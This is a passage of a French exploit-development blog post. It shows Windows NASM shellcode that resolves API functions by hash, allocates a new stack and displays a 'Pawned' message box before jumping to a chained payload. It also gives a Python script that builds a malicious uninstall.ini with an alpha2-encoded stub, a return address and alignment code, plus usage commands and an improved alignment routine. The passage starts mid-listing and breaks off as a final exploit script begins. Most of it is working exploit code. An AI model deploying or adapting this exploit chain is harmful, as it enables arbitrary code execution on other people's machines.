<span class="c">; message to show :)</span>
<span class="n">pawnMsg</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Pawned</span> <span class="n">by</span> <span class="n">m_101</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>
<span class="n">pawnTitle</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Hacked</span><span class="err">!</span> <span class="o">:</span><span class="p">)</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>

    <span class="c">; (alpha2 payload eax based)</span>
    <span class="n">payload</span><span class="o">:</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Le code est bien commenté donc assez compréhensible ^^.
Dans cette payload, j’effectue les actions suivantes :</p>

<ul>
  <li>recherche de la base de kernel32</li>
  <li>résolution des symbôles de kernel32</li>
  <li>LoadLibraryA (“ntdll.dll”)</li>
  <li>résolution des symbôles de ntdll</li>
  <li>allocation de mémoire :
     RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, MEMORY_SIZE)</li>
  <li>VirtualProtect() // inutile ici mais ça pourrait être utile pour faire du staging par exemple ;)</li>
  <li>On set esp à la zone allouée</li>
  <li>MessageBox()</li>
  <li>Calcul de la position de notre “vraie” payload + jmp vers celle-ci (EAX based)</li>
</ul>

<p>J’ai légèrement tweaké la routine de résolution des symbols de skape (ret 8 à la
fin de find_function).
Y’a moyen d’optimiser plus mais bon, ici on a 5268 octets d’espace, on a largement
de quoi faire :).</p>

<h1 id="finally-hacked">Finally hacked?</h1>

<p>Let’s try that :).</p>

<p><img src="/assets/img/powershell_12_Pawned.png" alt="PowerShell pwned" /></p>

<p>Oh yeah baby! :)</p>

<h1 id="le-sploit">Le sploit</h1>

<p>Comme vu dans mon shellcode windows, je fais un jmp eax après, ça explique le fait
qu’il faudra baser votre payload alpha2 encoded sur EAX ;). Si vous voulez changer
de base address, suffit de modder le shellcode ;).
Here it is :</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># vuln finders : kmkz, zadyree, hellpast
# author : m_101 
# site         : binholic.blogspot.com
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: </span><span class="si">%</span><span class="s">s input output payload"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># get file content
</span><span class="n">infile</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1">#
</span><span class="n">fpayload</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">fpayload</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># first offset ... but not enough room
# ret_offset = 248
</span><span class="n">ret_offset</span> <span class="o">=</span> <span class="mi">5268</span>
<span class="c1"># size 118, tag = 'PAWN'
</span><span class="n">allocnewstack</span> <span class="o">=</span> <span class="s">"TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkffbxyyFeWpgpUPixL5kOKOKOmQzLupS0uPS0mY8eOy3udTKXnMgpgpwpmYKrnkqeUDmQkvssgqwpUPlIxqmQkqDLuPuP5Pnm1mUPKXDC6aePUPLKQM7dK1HCcguQwp5PbsKOpU5XmYkroyXqk1yQdDuPEPgpM8KWwpuPePlKqMDTMQYSqquQUPWpSckOPUuXk9ZblIZQmQjawtc0Gp7pKXzkGpwp7pio2u5PPhuPwpdPWpU8fh7pwpS0pPkOSeVlRpLMrmELSaQxspGpEPEPE8EPWpR0GpRp9oPUWtPZOqYR5Pgp4PGp1B3lSXEP7pGp30nkQM6tMQZcSLc1ePWpRsNksm5DoqiS0l5QC0UPpSqxs0EPEP7p9o65FpLKSub4OKWmfcwpUP7qN8kOKPeao0cTgsw000RXtLnkQPflNkpp5LNMlKspTHHkWylKQPp4lMcpQlLK1PelKsu0nkplQ4utNk2egLnkQDs5RXs1jJLKQZ6xlK3jep7qHkm3dw0INk4tnkgq8n4qkOP1o0kLNLmTYPrTgzkqZoTMeQkwXi9akOKOkO7KqletQ82U9NnkpZa4uQzKSVlKVlpKlKRzuLC1ZKLK5TnkVajHMYqTUtULaqYRC8S0LmrppRkXMuIoioKOOyfgOqO7Fds0uPEPuixNRUHl9SLnXlfnlhUKYV3vaiNn2nDNxl16gUuIenLhY2pMOLRNqdCTBLrL6NqtrLPlwp45qccUT2wCDrFNqtPlRL30rppaQg0nu5e4WPU2PyWPrMCo5aVPUauPw8cQ53PkquQtwQ5pDzGYS0A"</span>

<span class="c1"># pop pop ret
</span><span class="n">ret</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x9e\x13\x40\x00</span><span class="s">"</span>

<span class="n">ecx</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x45\x61\x39\x76</span><span class="s">"</span>
<span class="n">eax</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x47\x61\x39\x76</span><span class="s">"</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Constructing alignment code"</span><span class="p">)</span>
<span class="c1"># alignment code
# dec esp
# dec esp
# dec esp
# dec esp
</span><span class="n">align</span> <span class="o">=</span> <span class="s">'L'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="c1"># pop esp (make esp point to data)
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span>
<span class="c1"># popad
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'a'</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">'K'</span> <span class="o">*</span> <span class="mi">18</span> <span class="c1"># junk byte :)
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'C'</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'C'</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># eax
</span>
<span class="c1"># buffer need to be long enough ;)
</span><span class="k">print</span><span class="p">(</span><span class="s">"Padding"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Constructing payload"</span><span class="p">)</span>
<span class="c1"># we need to allocate a new stack or it will trigger an access violation because we reach end of .data section
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">allocnewstack</span> <span class="o">+</span> <span class="n">payload</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Payload size : </span><span class="si">%</span><span class="s">u"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="c1"># let's have the minimum correct buffer length!
</span><span class="n">padding</span> <span class="o">=</span> <span class="p">(</span><span class="n">ret_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">align</span><span class="p">))</span> <span class="o">*</span> <span class="s">'C'</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Constructing egg"</span><span class="p">)</span>
<span class="n">egg</span> <span class="o">=</span> <span class="n">align</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ret</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Egg size : </span><span class="si">%</span><span class="s">u"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">egg</span><span class="p">))</span>

<span class="n">modified</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'TESTTEST'</span><span class="p">,</span> <span class="n">egg</span><span class="p">)</span>

<span class="c1"># working
</span><span class="n">outfile</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="k">print</span> <span class="p">(</span><span class="s">"Writing exploit file : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">outfile</span><span class="p">)</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
<span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">modified</span><span class="p">)</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Usage :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre>./alpha2 esp &lt; allocnewstack
./sploit.py uninstall.ini.tomod uninstall.ini <span class="o">[</span>payload]</pre></td></tr></tbody></table></code></pre></figure>

<p>Le fichier uninstall.ini.tomod est fourni en fin d’article.</p>

<h1 id="comment-ça-ça-servait-à-rien-de-shellcoder-une-payload-maison">Comment ça, ça servait à rien de shellcoder une payload maison?</h1>

<p>:) bah oui y’a quand même plus simple hein que de devoir faire une payload d’allocation d’une nouvelle stack … fallait bien que je trouve une excuse pour le shellcoding windows et puis c’est quand même plus classe de pouvoir crafter ses propres payloads :p. Anyway, suffit de tweaker un peu mieux notre code d’alignement pour que tout roule nickel ;).</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="code"><pre><span class="c1"># alignment code
# dec esp
# dec esp
# dec esp
# dec esp
</span><span class="n">align</span> <span class="o">=</span> <span class="s">'L'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="c1"># push esp  ; save current esp register
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'T'</span>
<span class="c1"># pop edx   ; save in edx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'Z'</span>
<span class="c1"># pop esp (make esp point to data)
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span>
<span class="c1"># push edx  ; old esp register
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'R'</span>    <span class="c1"># edi
# popad
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'a'</span>

<span class="c1"># align += ecx
# align += eax
</span>
<span class="c1"># we get actual value (for later restore ;))
# pop ecx
# push ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x59\x51</span><span class="s">"</span>
<span class="c1"># push esp
# pop eax       ; here the code is adjusted but we still need to restore old stack
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'TX'</span>
<span class="c1"># we repatch the stack (or we may have bad memory access ;))
# push ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x51</span><span class="s">"</span>
<span class="c1"># we don't want our current instructions to be crushed
# dec esp * 4
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'L'</span> <span class="o">*</span> <span class="mi">8</span>
<span class="c1"># push edi  ; old stack
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'W'</span>
<span class="c1"># pop esp   ; restore old stack
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span>
<span class="c1"># junk bytes
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'K'</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># scrape space (esp point here)</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Ici le registre de base est EAX par contre (push esp, pop eax) vu qu’on restore
l’ancienne stack. Et wala, on est passé de 1362 octets à 501 octets sans la
payload maison ;).  Bien sûr, vous pourrez toujours en ajouter une maintenant
que vous savez faire :). Les push ecx sont là pour restorer les instructions
écrasées sur la stack (qu’on exécute!) sinon on peut avoir un access violation!</p>

<p>Au final, notre shellcode ressemble désormais à ça :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
</pre></td><td class="code"><pre><span class="n">bits</span> <span class="mi">32</span>

<span class="c">; defines</span>
<span class="n">PAGE_EXECUTE_READWRITE</span>  <span class="k">equ</span> <span class="mh">0x40</span>
<span class="n">HEAP_ZERO_MEMORY</span> <span class="k">equ</span> <span class="mh">0x8</span>
<span class="c">; 1KB</span>
<span class="n">KB</span> <span class="k">equ</span> <span class="mi">1024</span>
<span class="n">MB</span> <span class="k">equ</span> <span class="mi">1024</span><span class="o">*</span><span class="n">KB</span>

<span class="c">; 1MB stack</span>
<span class="n">MEMORY_SIZE</span> <span class="k">equ</span> <span class="n">MB</span>
<span class="n">GETSTUB_SIZE</span> <span class="k">equ</span> <span class="mi">13</span>
<span class="n">ENCODER_SIZE</span> <span class="k">equ</span> <span class="mi">51</span>
<span class="n">CURRENT_PAYLOAD_SIZE</span> <span class="k">equ</span> <span class="mi">585</span>
<span class="n">CURRENT_PAYLOAD_OFFSET</span> <span class="k">equ</span> <span class="n">CURRENT_PAYLOAD_SIZE</span> <span class="o">-</span> <span class="n">ENCODER_SIZE</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
<span class="n">PAYLOAD_SIZE</span> <span class="k">equ</span> <span class="mi">5268</span><span class="o">-</span><span class="n">CURRENT_PAYLOAD_OFFSET</span>

<span class="c">; hash</span>
<span class="n">MESSAGEBOXAHASH</span>     <span class="k">equ</span>     <span class="mh">0xbc4da2a8</span>
<span class="n">LOADLIBRARYAHASH</span>    <span class="k">equ</span>     <span class="mh">0xec0e4e8e</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
    <span class="kr">global</span> <span class="n">main</span>

<span class="n">alloc_start</span><span class="o">:</span>
<span class="n">main</span><span class="o">:</span>
    <span class="c">; get current stub address</span>
    <span class="k">jmp</span> <span class="n">short</span> <span class="n">redirect</span>
    <span class="n">get_eip_ret</span><span class="o">:</span>
        <span class="k">pop</span> <span class="n">eax</span> <span class="c">; eip</span>
        <span class="k">jmp</span> <span class="n">current_payload</span>
    <span class="n">redirect</span><span class="o">:</span>
    <span class="k">call</span> <span class="n">get_eip_ret</span>

    <span class="n">current_payload</span><span class="o">:</span>
    <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x20</span>   <span class="c">; make room on stack to store pointers</span>
    <span class="k">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>

    <span class="c">; search kernel32 base address</span>
    <span class="k">call</span> <span class="n">find_kernel32</span>

    <span class="c">; kernel32.dll</span>
    <span class="c">; resolve LoadLibraryA</span>
    <span class="k">push</span> <span class="n">LOADLIBRARYAHASH</span>
    <span class="k">push</span> <span class="n">eax</span>
    <span class="k">call</span> <span class="n">find_function</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">LOADLIBRARYA</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>

    <span class="c">; LoadLibraryA('user32.dll')</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">user32_dll</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; 'user32.dll'</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">LOADLIBRARYA</span><span class="err">]</span>

    <span class="c">; user32.dll</span>
    <span class="c">; resolve MessageBoxA</span>
    <span class="k">push</span> <span class="n">MESSAGEBOXAHASH</span>
    <span class="k">push</span> <span class="n">eax</span>
    <span class="k">call</span> <span class="n">find_function</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">MESSAGEBOXA</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>

    <span class="c">; show message :)</span>
    <span class="k">push</span> <span class="mi">0</span>                              <span class="c">; uType = MB_OK</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">pawnTitle</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>                            <span class="c">; lpCaption = 'Hacked! :)'</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">pawnMsg</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>                            <span class="c">; lpText = 'Pawned by m_101'</span>
    <span class="k">push</span> <span class="mi">0</span>                              <span class="c">; hWnd = NULL = no owner window</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">MESSAGEBOXA</span><span class="err">]</span>

    <span class="c">; we compute payload address for jmp</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">CURRENT_PAYLOAD_OFFSET</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ebx</span>

    <span class="c">; jmp to payload</span>
    <span class="k">jmp</span> <span class="n">eax</span>

<span class="c">; get kernel32 module base address from PEB</span>
<span class="c">; void* find_kernel32(void)</span>
<span class="n">find_kernel32</span><span class="o">:</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">fs</span><span class="o">:</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x30</span><span class="err">]</span>       <span class="c">; eax = PEB</span>
    <span class="k">js</span> <span class="n">short</span> <span class="n">method_9x</span>

    <span class="n">method_nt</span><span class="o">:</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">ch</span><span class="err">]</span>      <span class="c">; PEB_LDR_DATA *</span>
        <span class="k">mov</span>   <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">1</span><span class="n">ch</span><span class="err">]</span>      <span class="c">; PEB_LDR_DATA.InInitializationOrderModuleList</span>
        <span class="k">lodsd</span>                       <span class="c">; eax = [esi]   get kernel32 entry</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">08</span><span class="n">h</span><span class="err">]</span>      <span class="c">; kernel32 DllBase</span>
        <span class="k">jmp</span> <span class="n">short</span> <span class="n">kernel32_ptr_found</span>

    <span class="n">method_9x</span><span class="o">:</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">34</span><span class="n">h</span><span class="err">]</span>
        <span class="k">lea</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">7</span><span class="n">ch</span><span class="err">]</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">3</span><span class="n">ch</span><span class="err">]</span>
    <span class="n">kernel32_ptr_found</span><span class="o">:</span>
    <span class="k">ret</span>

<span class="c">; resolve function address</span>
<span class="c">; void* find_function (void *base, unsigned int hash)</span>
<span class="n">find_function</span><span class="o">:</span>
    <span class="k">pushad</span>                          <span class="c">; save all registers ^^</span>
    <span class="k">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mh">0x24</span><span class="err">]</span>           <span class="c">; VA base address of module</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="err">]</span>           <span class="c">; pe header</span>
    <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span> <span class="o">+</span> <span class="n">eax</span> <span class="o">+</span> <span class="mh">0x78</span><span class="err">]</span>     <span class="c">; get export address table</span>
    <span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebp</span>                    <span class="c">; VA of EAT</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x18</span><span class="err">]</span>           <span class="c">; number of exported functions</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="err">]</span>           <span class="c">; name table</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebp</span>                    <span class="c">; VA of name table</span>

    <span class="n">find_function_loop</span><span class="o">:</span>
        <span class="k">jecxz</span> <span class="n">find_function_finished</span>    <span class="c">; if ecx == 0 then unresolved</span>
        <span class="k">dec</span> <span class="n">ecx</span>                         <span class="c">; one entry less to check</span>
        <span class="k">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="n">ecx</span> <span class="o">*</span> <span class="mi">4</span><span class="err">]</span>        <span class="c">; name offset of current symbol</span>
        <span class="k">add</span> <span class="n">esi</span><span class="p">,</span> <span class="n">ebp</span>                    <span class="c">; VA of name</span>

        <span class="n">compute_hash</span><span class="o">:</span>
            <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>                <span class="c">; hash = 0</span>
            <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                <span class="c">; character</span>
            <span class="k">cld</span>                         <span class="c">; assure it increment by setting DF=0</span>

            <span class="n">compute_hash_again</span><span class="o">:</span>
                <span class="k">lodsb</span>                       <span class="c">;</span>
                <span class="k">test</span> <span class="n">al</span><span class="p">,</span> <span class="n">al</span>                 <span class="c">; end of string reached?</span>
                <span class="k">jz</span> <span class="n">compute_hash_finished</span>    <span class="c">; if yes, finished to hash</span>
                <span class="k">ror</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0xd</span>                <span class="c">; rotate right for 13 bits</span>
                <span class="k">add</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>                <span class="c">; hash</span>
            <span class="k">jmp</span> <span class="n">compute_hash_again</span>
        <span class="n">compute_hash_finished</span><span class="o">:</span>

        <span class="n">find_function_compare</span><span class="o">:</span>
            <span class="k">cmp</span> <span class="n">edi</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mh">0x28</span><span class="err">]</span>           <span class="c">; does it match requested hash?</span>
    <span class="k">jnz</span> <span class="n">find_function_loop</span>                  <span class="c">; if not we continue searching</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x24</span><span class="err">]</span>               <span class="c">; ordinal table offset</span>
        <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebp</span>                        <span class="c">; VA of ordinal table offset</span>
        <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">ecx</span><span class="err">]</span>             <span class="c">; current ordinal</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="err">]</span>               <span class="c">; address table offset</span>
        <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebp</span>                        <span class="c">; VA of address table offset</span>
        <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">ecx</span><span class="err">]</span>            <span class="c">; relative function offset</span>
        <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ebp</span>                        <span class="c">; function VA yeepee!</span>
        <span class="k">mov</span> <span class="err">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>               <span class="c">; patch saved eax value</span>
    <span class="n">find_function_finished</span><span class="o">:</span>

    <span class="k">popad</span>                                   <span class="c">; restore :)</span>
    <span class="k">ret</span> <span class="mi">8</span>

<span class="c">; offset compared to ebp ;)</span>
<span class="c">; kernel32</span>
<span class="n">KERNEL32_FUNC_TABLE</span>     <span class="k">equ</span> <span class="mi">0</span>
<span class="n">LOADLIBRARYA</span>            <span class="k">equ</span> <span class="mi">0</span>

<span class="c">; user32</span>
<span class="n">USER32_FUNC_TABLE</span>   <span class="k">equ</span> <span class="mi">4</span>
<span class="n">MESSAGEBOXA</span>         <span class="k">equ</span> <span class="mi">4</span>

<span class="c">;</span>
<span class="n">ADDRESS_STUB</span>        <span class="k">equ</span> <span class="mi">8</span>

<span class="c">; dll to load</span>
<span class="n">user32_dll</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">user32</span><span class="p">.</span><span class="n">dll</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>

<span class="c">; message to show :)</span>
<span class="n">pawnTitle</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Hacked</span><span class="err">!</span> <span class="o">:</span><span class="p">)</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>
<span class="n">pawnMsg</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Pawned</span> <span class="n">by</span> <span class="n">m_101</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>

    <span class="c">; (alpha2 payload eax based)</span>
    <span class="n">payload</span><span class="o">:</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Et voilà le résultat :).
Dans les deux shellcodes vous pouvez voir que j’ai des defines pour la payload,
ça sert à calculer l’offset de la seconde payload en alpha2 qui est concaténée
à la suite ;).</p>

<p>Ca nous donne donc l’exploit final :</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># vuln finders : kmkz, zadyree, hellpast
# author       : m_101
# site         : binholic.blogspot.com
</span><span class="kn">import</span> <span class="nn">sys</span>

